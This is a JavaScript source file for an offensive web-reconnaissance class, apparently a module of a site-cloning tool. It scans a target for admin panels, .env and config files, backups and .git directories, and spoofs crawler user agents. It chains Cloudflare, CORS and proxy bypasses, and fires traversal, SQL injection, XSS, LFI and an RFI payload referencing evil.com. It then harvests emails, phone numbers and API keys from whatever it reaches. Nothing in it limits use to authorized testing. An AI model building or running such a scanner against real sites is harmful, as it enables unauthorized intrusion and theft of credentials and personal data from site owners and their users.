// Advanced Reconnaissance and Data Mining System
class AdvancedReconnaissance {
    constructor() {
        this.discoveredData = new Map();
        this.sensitivePaths = [
            // Admin and control panels
            '/admin', '/administrator', '/admin.php', '/admin.html', '/admin.asp',
            '/wp-admin', '/wp-admin/admin-ajax.php', '/wp-admin/admin-post.php',
            '/cpanel', '/webmail', '/phpmyadmin', '/mysql', '/database',
            '/panel', '/dashboard', '/control', '/manage', '/management',
            
            // Configuration files
            '/config.php', '/config.ini', '/config.json', '/config.xml',
            '/.env', '/.env.local', '/.env.production', '/.env.development',
            '/wp-config.php', '/configuration.php', '/settings.php',
            '/database.php', '/db.php', '/connection.php',
            
            // Log files
            '/logs', '/log', '/error.log', '/access.log', '/debug.log',
            '/admin.log', '/system.log', '/security.log', '/audit.log',
            '/apache.log', '/nginx.log', '/iis.log', '/php_error.log',
            
            // Backup and development files
            '/backup', '/backups', '/bak', '/old', '/archive',
            '/.git', '/.svn', '/.hg', '/.bzr', '/.cvs',
            '/.DS_Store', '/Thumbs.db', '/desktop.ini',
            '/composer.json', '/package.json', '/yarn.lock', '/npm-debug.log',
            
            // API endpoints
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
            '/swagger', '/swagger.json', '/openapi.json', '/docs',
            '/oauth', '/auth', '/login', '/register', '/signup',
            
            // CMS specific
            '/wp-content', '/wp-includes', '/wp-json', '/wp-cron.php',
            '/joomla', '/drupal', '/magento', '/shop', '/store',
            '/blog', '/forum', '/community', '/support',
            
            // Server information
            '/server-status', '/server-info', '/status', '/info',
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
            '/robots.txt', '/sitemap.xml', '/.htaccess', '/web.config',
            
            // Database dumps
            '/dump', '/export', '/backup.sql', '/database.sql',
            '/db_backup', '/sql', '/mysql', '/postgresql',
            
            // Sensitive directories
            '/private', '/secret', '/hidden', '/internal',
            '/temp', '/tmp', '/cache', '/sessions', '/uploads',
            '/files', '/documents', '/images', '/media'
        ];
        
        this.commonFileExtensions = [
            '.php', '.asp', '.aspx', '.jsp', '.js', '.html', '.htm',
            '.xml', '.json', '.txt', '.log', '.sql', '.bak', '.old',
            '.zip', '.tar', '.gz', '.rar', '.7z', '.db', '.sqlite'
        ];
        
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)',
            'Slurp/2.0 (+http://help.yahoo.com/help/us/ysearch/slurp)'
        ];
    }

    async startReconnaissance(baseUrl, cloner) {
        cloner.addLog('🔍 Starting ADVANCED RECONNAISSANCE...', 'system');
        cloner.updateAI('Initiating comprehensive data reconnaissance...');
        
        const results = {
            sensitiveFiles: [],
            adminPanels: [],
            configFiles: [],
            logFiles: [],
            apiEndpoints: [],
            databaseFiles: [],
            backupFiles: [],
            serverInfo: [],
            cmsInfo: [],
            securityIssues: []
        };

        // Phase 1: Directory and file discovery
        cloner.addLog('📁 Phase 1: Directory and file discovery...', 'system');
        const discoveredPaths = await this.discoverSensitivePaths(baseUrl, results, cloner);
        
        // Early termination if significant findings
        if (discoveredPaths.filter(p => p.accessible && p.priority === 'high').length >= 3) {
            cloner.addLog('🎯 Significant high-priority findings detected! Stopping early reconnaissance.', 'success');
            cloner.addLog('💡 Found enough sensitive data to proceed with extraction.', 'info');
        } else {
            // Phase 2: CMS and framework detection
            cloner.addLog('🔍 Phase 2: CMS and framework detection...', 'system');
            await this.detectCMS(baseUrl, results, cloner);

            // Phase 3: API endpoint discovery
            cloner.addLog('🔌 Phase 3: API endpoint discovery...', 'system');
            await this.discoverAPIEndpoints(baseUrl, results, cloner);

            // Phase 4: Server information gathering
            cloner.addLog('🖥️ Phase 4: Server information gathering...', 'system');
            await this.gatherServerInfo(baseUrl, results, cloner);

            // Phase 5: Security vulnerability scanning
            cloner.addLog('🛡️ Phase 5: Security vulnerability scanning...', 'system');
            await this.scanVulnerabilities(baseUrl, results, cloner);
        }

        // Phase 6: Data extraction attempts (always run)
        cloner.addLog('📊 Phase 6: Data extraction attempts...', 'system');
        await this.extractSensitiveData(baseUrl, results, cloner);

        return results;
    }

    async discoverSensitivePaths(baseUrl, results, cloner) {
        const discoveredPaths = [];
        
        // Prioritize the most likely paths first
        const priorityPaths = [
            '/admin', '/administrator', '/wp-admin', '/cpanel',
            '/robots.txt', '/sitemap.xml', '/.htaccess', '/web.config',
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
            '/swagger', '/swagger.json', '/openapi.json', '/docs',
            '/oauth', '/auth', '/login', '/register', '/signup'
        ];
        
        // Secondary paths
        const secondaryPaths = [
            '/admin.php', '/admin.html', '/admin.asp',
            '/wp-admin/admin-ajax.php', '/wp-admin/admin-post.php',
            '/webmail', '/phpmyadmin', '/mysql', '/database',
            '/panel', '/dashboard', '/control', '/manage', '/management',
            '/config.php', '/config.ini', '/config.json', '/config.xml',
            '/.env', '/.env.local', '/.env.production', '/.env.development',
            '/wp-config.php', '/configuration.php', '/settings.php',
            '/database.php', '/db.php', '/connection.php'
        ];
        
        // Less likely paths
        const tertiaryPaths = [
            '/logs', '/log', '/error.log', '/access.log', '/debug.log',
            '/admin.log', '/system.log', '/security.log', '/audit.log',
            '/apache.log', '/nginx.log', '/iis.log', '/php_error.log',
            '/backup', '/backups', '/bak', '/old', '/archive',
            '/.git', '/.svn', '/.hg', '/.bzr', '/.cvs',
            '/.DS_Store', '/Thumbs.db', '/desktop.ini',
            '/composer.json', '/package.json', '/yarn.lock', '/npm-debug.log',
            '/wp-content', '/wp-includes', '/wp-json', '/wp-cron.php',
            '/joomla', '/drupal', '/magento', '/shop', '/store',
            '/blog', '/forum', '/community', '/support',
            '/server-status', '/server-info', '/status', '/info',
            '/dump', '/export', '/backup.sql', '/database.sql',
            '/db_backup', '/sql', '/mysql', '/postgresql',
            '/private', '/secret', '/hidden', '/internal',
            '/temp', '/tmp', '/cache', '/sessions', '/uploads',
            '/files', '/documents', '/images', '/media'
        ];
        
        // Combine all paths with priority
        const allPaths = [...priorityPaths, ...secondaryPaths, ...tertiaryPaths];
        
        cloner.addLog(`🔍 Scanning ${allPaths.length} potential sensitive paths...`, 'system');
        
        for (let i = 0; i < allPaths.length; i++) {
            const path = allPaths[i];
            try {
                const url = new URL(path, baseUrl).href;
                
                // Show progress every 10 paths
                if (i % 10 === 0) {
                    cloner.addLog(`🔍 Progress: ${i}/${allPaths.length} paths checked...`, 'system');
                }
                
                cloner.addLog(`🔍 Checking: ${path}`, 'system');
                
                const response = await this.makeRequest(url, cloner);
                if (response && response.status !== 404) {
                    discoveredPaths.push({
                        path: path,
                        url: url,
                        status: response.status,
                        accessible: response.status < 400,
                        priority: i < priorityPaths.length ? 'high' : i < priorityPaths.length + secondaryPaths.length ? 'medium' : 'low'
                    });
                    
                    if (response.status < 400) {
                        cloner.addLog(`✅ Found accessible path: ${path} (${response.status})`, 'success');
                        
                        // Categorize the discovery
                        if (path.includes('admin')) {
                            results.adminPanels.push({ path, url, status: response.status });
                        } else if (path.includes('config') || path.includes('.env')) {
                            results.configFiles.push({ path, url, status: response.status });
                        } else if (path.includes('log')) {
                            results.logFiles.push({ path, url, status: response.status });
                        } else if (path.includes('api')) {
                            results.apiEndpoints.push({ path, url, status: response.status });
                        } else if (path.includes('backup') || path.includes('.sql')) {
                            results.backupFiles.push({ path, url, status: response.status });
                        } else {
                            results.sensitiveFiles.push({ path, url, status: response.status });
                        }
                    }
                }
                
                // Add a small delay to avoid overwhelming the server
                await new Promise(resolve => setTimeout(resolve, 100));
                
            } catch (error) {
                // Don't log every failed request to avoid spam
                if (i % 20 === 0) {
                    cloner.addLog(`⚠️ Some requests are being blocked (${error.message})`, 'warning');
                }
            }
        }
        
        cloner.addLog(`📊 Discovered ${discoveredPaths.length} potentially sensitive paths`, 'system');
        
        // Show summary of findings
        if (discoveredPaths.length > 0) {
            cloner.addLog(`🎯 High priority findings: ${discoveredPaths.filter(p => p.priority === 'high' && p.accessible).length}`, 'success');
            cloner.addLog(`🎯 Medium priority findings: ${discoveredPaths.filter(p => p.priority === 'medium' && p.accessible).length}`, 'info');
            cloner.addLog(`🎯 Low priority findings: ${discoveredPaths.filter(p => p.priority === 'low' && p.accessible).length}`, 'info');
        }
        
        return discoveredPaths;
    }

    async detectCMS(baseUrl, results, cloner) {
        const cmsSignatures = {
            'WordPress': [
                '/wp-admin', '/wp-content', '/wp-includes', '/wp-json',
                'wp-content', 'wp-includes', 'wp-admin'
            ],
            'Joomla': [
                '/administrator', '/components', '/modules', '/plugins',
                'joomla', 'Joomla!'
            ],
            'Drupal': [
                '/admin', '/sites/default', '/modules', '/themes',
                'Drupal', 'drupal'
            ],
            'Magento': [
                '/admin', '/app', '/var', '/media',
                'Magento', 'magento'
            ],
            'Laravel': [
                '/storage', '/bootstrap', '/app', '/resources',
                'Laravel', 'laravel'
            ],
            'Django': [
                '/admin', '/static', '/media', '/templates',
                'Django', 'django'
            ]
        };

        try {
            const response = await this.makeRequest(baseUrl, cloner);
            const html = await response.text();
            
            for (const [cms, signatures] of Object.entries(cmsSignatures)) {
                for (const signature of signatures) {
                    if (html.includes(signature) || baseUrl.includes(signature)) {
                        results.cmsInfo.push({
                            cms: cms,
                            confidence: 'high',
                            signature: signature
                        });
                        cloner.addLog(`🎯 Detected CMS: ${cms} (signature: ${signature})`, 'success');
                        break;
                    }
                }
            }
        } catch (error) {
            cloner.addLog(`❌ CMS detection failed: ${error.message}`, 'warning');
        }
    }

    async discoverAPIEndpoints(baseUrl, results, cloner) {
        const apiPatterns = [
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
            '/swagger', '/swagger.json', '/openapi.json', '/docs',
            '/oauth', '/auth', '/login', '/register', '/signup',
            '/user', '/users', '/admin', '/admin/api',
            '/data', '/export', '/import', '/sync'
        ];

        for (const pattern of apiPatterns) {
            try {
                const url = new URL(pattern, baseUrl).href;
                const response = await this.makeRequest(url, cloner);
                
                if (response.status !== 404) {
                    results.apiEndpoints.push({
                        endpoint: pattern,
                        url: url,
                        status: response.status,
                        accessible: response.status < 400
                    });
                    
                    if (response.status < 400) {
                        cloner.addLog(`🔌 Found API endpoint: ${pattern} (${response.status})`, 'success');
                        
                        // Try to extract data from API
                        try {
                            const data = await response.text();
                            if (data.includes('{') || data.includes('[')) {
                                cloner.addLog(`📊 API endpoint contains data: ${pattern}`, 'info');
                                this.discoveredData.set(pattern, data);
                            }
                        } catch (error) {
                            // Ignore parsing errors
                        }
                    }
                }
            } catch (error) {
                // Continue to next endpoint
            }
        }
    }

    async gatherServerInfo(baseUrl, results, cloner) {
        const infoEndpoints = [
            '/server-status', '/server-info', '/status', '/info',
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
            '/robots.txt', '/sitemap.xml', '/.htaccess', '/web.config'
        ];

        for (const endpoint of infoEndpoints) {
            try {
                const url = new URL(endpoint, baseUrl).href;
                const response = await this.makeRequest(url, cloner);
                
                if (response.status !== 404) {
                    results.serverInfo.push({
                        endpoint: endpoint,
                        url: url,
                        status: response.status,
                        accessible: response.status < 400
                    });
                    
                    if (response.status < 400) {
                        cloner.addLog(`🖥️ Found server info: ${endpoint} (${response.status})`, 'success');
                        
                        try {
                            const data = await response.text();
                            this.discoveredData.set(endpoint, data);
                            
                            // Extract specific information
                            if (endpoint.includes('phpinfo')) {
                                this.extractPHPInfo(data, results, cloner);
                            } else if (endpoint.includes('robots')) {
                                this.extractRobotsInfo(data, results, cloner);
                            }
                        } catch (error) {
                            // Ignore parsing errors
                        }
                    }
                }
            } catch (error) {
                // Continue to next endpoint
            }
        }
    }

    async scanVulnerabilities(baseUrl, results, cloner) {
        const vulnerabilities = [
            { name: 'Directory Traversal', test: '/../../../etc/passwd' },
            { name: 'SQL Injection', test: '/admin?id=1\' OR 1=1--' },
            { name: 'XSS', test: '/search?q=<script>alert(1)</script>' },
            { name: 'LFI', test: '/include.php?file=../../../etc/passwd' },
            { name: 'RFI', test: '/include.php?file=http://evil.com/shell.txt' }
        ];

        for (const vuln of vulnerabilities) {
            try {
                const url = new URL(vuln.test, baseUrl).href;
                const response = await this.makeRequest(url, cloner);
                
                if (response.status !== 404 && response.status !== 403) {
                    results.securityIssues.push({
                        vulnerability: vuln.name,
                        test: vuln.test,
                        status: response.status,
                        potentially_vulnerable: true
                    });
                    cloner.addLog(`⚠️ Potential ${vuln.name} vulnerability detected`, 'warning');
                }
            } catch (error) {
                // Continue to next test
            }
        }
    }

    async extractSensitiveData(baseUrl, results, cloner) {
        // Try to extract data from discovered endpoints
        for (const [endpoint, data] of this.discoveredData) {
            try {
                // Extract emails
                const emails = data.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
                if (emails) {
                    cloner.addLog(`📧 Found emails in ${endpoint}: ${emails.join(', ')}`, 'info');
                }

                // Extract phone numbers
                const phones = data.match(/[\+]?[1-9][\d]{0,15}/g);
                if (phones) {
                    cloner.addLog(`📞 Found phone numbers in ${endpoint}: ${phones.join(', ')}`, 'info');
                }

                // Extract API keys
                const apiKeys = data.match(/[a-zA-Z0-9]{32,}/g);
                if (apiKeys) {
                    cloner.addLog(`🔑 Found potential API keys in ${endpoint}`, 'warning');
                }

                // Extract database connections
                const dbConnections = data.match(/mysql_connect|mysqli_connect|PDO|database_url/gi);
                if (dbConnections) {
                    cloner.addLog(`🗄️ Found database connections in ${endpoint}`, 'warning');
                }

            } catch (error) {
                // Continue to next data extraction
            }
        }
    }

    async makeRequest(url, cloner) {
        const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
        
        try {
            // Try multiple bypass methods
            let response = null;
            
            // Method 1: Standard fetch with headers
            try {
                response = await fetch(url, {
                    method: 'GET',
                    headers: {
                        'User-Agent': userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache'
                    },
                    mode: 'cors',
                    timeout: 10000
                });
                
                if (response && response.status < 400) {
                    return response;
                }
            } catch (error) {
                cloner.addLog(`🔄 Standard fetch failed for ${url}, trying bypass methods...`, 'warning');
            }
            
            // Method 2: Try with ultra bypass
            if (cloner.ultraBypass) {
                try {
                    response = await cloner.ultraBypass.ultraFetch(url);
                    if (response && response.status < 400) {
                        cloner.addLog(`✅ Ultra bypass successful for ${url}`, 'success');
                        return response;
                    }
                } catch (error) {
                    cloner.addLog(`⚠️ Ultra bypass failed for ${url}`, 'warning');
                }
            }
            
            // Method 3: Try with Cloudflare bypass
            if (cloner.cloudflareBypass) {
                try {
                    response = await cloner.cloudflareBypass.bypassCloudflare(url, cloner);
                    if (response && response.status < 400) {
                        cloner.addLog(`✅ Cloudflare bypass successful for ${url}`, 'success');
                        return response;
                    }
                } catch (error) {
                    cloner.addLog(`⚠️ Cloudflare bypass failed for ${url}`, 'warning');
                }
            }
            
            // Method 4: Try with ultimate bypass
            if (cloner.ultimateBypass) {
                try {
                    response = await cloner.ultimateBypass.ultimateBypass(url, cloner);
                    if (response && response.status < 400) {
                        cloner.addLog(`✅ Ultimate bypass successful for ${url}`, 'success');
                        return response;
                    }
                } catch (error) {
                    cloner.addLog(`⚠️ Ultimate bypass failed for ${url}`, 'warning');
                }
            }
            
            // Method 5: Try with CORS bypass
            if (cloner.corsBypass) {
                try {
                    const result = await cloner.corsBypass.scrapeWebsite(url);
                    if (result && result.html) {
                        cloner.addLog(`✅ CORS bypass successful for ${url}`, 'success');
                        // Create a mock response object
                        return {
                            status: 200,
                            text: async () => result.html,
                            ok: true
                        };
                    }
                } catch (error) {
                    cloner.addLog(`⚠️ CORS bypass failed for ${url}`, 'warning');
                }
            }
            
            // Method 6: Try with proxy
            try {
                const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(url)}`;
                response = await fetch(proxyUrl);
                if (response.ok) {
                    const data = await response.json();
                    if (data.contents) {
                        cloner.addLog(`✅ Proxy successful for ${url}`, 'success');
                        return {
                            status: 200,
                            text: async () => data.contents,
                            ok: true
                        };
                    }
                }
            } catch (error) {
                cloner.addLog(`⚠️ Proxy failed for ${url}`, 'warning');
            }
            
            // Method 7: Try with different user agents
            const alternativeUserAgents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
            ];
            
            for (const altUserAgent of alternativeUserAgents) {
                try {
                    response = await fetch(url, {
                        method: 'GET',
                        headers: {
                            'User-Agent': altUserAgent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1'
                        },
                        mode: 'cors',
                        timeout: 8000
                    });
                    
                    if (response && response.status < 400) {
                        cloner.addLog(`✅ Alternative user agent successful for ${url}`, 'success');
                        return response;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            // If all methods fail, throw error
            throw new Error('All bypass methods failed');
            
        } catch (error) {
            throw error;
        }
    }

    extractPHPInfo(data, results, cloner) {
        const phpInfo = {
            version: data.match(/PHP Version ([0-9.]+)/)?.[1],
            server: data.match(/Server API ([^<]+)/)?.[1],
            os: data.match(/System ([^<]+)/)?.[1]
        };
        
        if (phpInfo.version) {
            cloner.addLog(`🐘 PHP Version: ${phpInfo.version}`, 'info');
        }
        if (phpInfo.server) {
            cloner.addLog(`🖥️ Server API: ${phpInfo.server}`, 'info');
        }
        if (phpInfo.os) {
            cloner.addLog(`💻 OS: ${phpInfo.os}`, 'info');
        }
    }

    extractRobotsInfo(data, results, cloner) {
        const disallowed = data.match(/Disallow: ([^\n]+)/g);
        if (disallowed) {
            cloner.addLog(`🤖 Robots.txt disallows: ${disallowed.join(', ')}`, 'info');
        }
        
        const sitemap = data.match(/Sitemap: ([^\n]+)/g);
        if (sitemap) {
            cloner.addLog(`🗺️ Found sitemaps: ${sitemap.join(', ')}`, 'info');
        }
    }

    generateReport(results, cloner) {
        cloner.addLog('📊 RECONNAISSANCE REPORT:', 'system');
        cloner.addLog(`📁 Sensitive Files: ${results.sensitiveFiles.length}`, 'info');
        cloner.addLog(`🔐 Admin Panels: ${results.adminPanels.length}`, 'info');
        cloner.addLog(`⚙️ Config Files: ${results.configFiles.length}`, 'info');
        cloner.addLog(`📝 Log Files: ${results.logFiles.length}`, 'info');
        cloner.addLog(`🔌 API Endpoints: ${results.apiEndpoints.length}`, 'info');
        cloner.addLog(`🗄️ Database Files: ${results.databaseFiles.length}`, 'info');
        cloner.addLog(`💾 Backup Files: ${results.backupFiles.length}`, 'info');
        cloner.addLog(`🖥️ Server Info: ${results.serverInfo.length}`, 'info');
        cloner.addLog(`🎯 CMS Info: ${results.cmsInfo.length}`, 'info');
        cloner.addLog(`🛡️ Security Issues: ${results.securityIssues.length}`, 'info');
        
        return results;
    }
}

// Export for use in main script
window.AdvancedReconnaissance = AdvancedReconnaissance; 